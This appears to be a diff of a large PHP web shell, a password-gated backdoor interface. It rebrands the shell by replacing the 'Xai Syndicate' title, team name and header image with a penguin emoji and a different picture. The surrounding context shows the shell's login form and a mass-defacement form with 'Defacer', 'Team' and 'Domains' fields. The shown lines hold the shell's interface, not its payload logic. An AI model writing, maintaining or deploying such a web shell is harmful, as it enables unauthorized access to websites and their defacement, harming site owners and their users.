@@ -44,7 +44,7 @@ function login_shell()
     ?>
 <html>
 <head>
-<title>Xai Syndicate</title>
+<title>🐧</title>
 <style type="text/css">
 html {
 	background: #000000;
@@ -67,7 +67,7 @@ input[type=password] {
 </style>
 </head>
 <header>
-<center><img src="https://t3.ftcdn.net/jpg/05/71/06/76/360_F_571067620_JS5T5TkDtu3gf8Wqm78KoJRF1vobPvo6.jpg" width="30%" height="50%"></img></center>
+<center><img src="https://upload-pro-heyuan-fashionphoto.oss-accelerate.aliyuncs.com/upload/page/models4/strength-and-grace-fitness-model-du-qiong-in-phuoc-quan-gym-with-sword-barbell-and-scale.png?x-oss-process=image/resize,w_283,m_lfit" width="30%" height="50%"></img></center>
 </header>
 <form method="post">
 <center><input type="password" name="pass"><center>
@@ -13290,7 +13290,7 @@ Satisfy Any
 		<u>Defacer</u>: <br>
 		<input type='text' name='hekel' size='50' value='Rinto AR'><br>
 		<u>Team</u>: <br>
-		<input type='text' name='tim' size='50' value='XaiSyndicate'><br>
+		<input type='text' name='tim' size='50' value='🐧'><br>
 		<u>Domains</u>: <br>
 		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
 		<input type='submit' name='go' value='Submit' style='width: 450px;'>
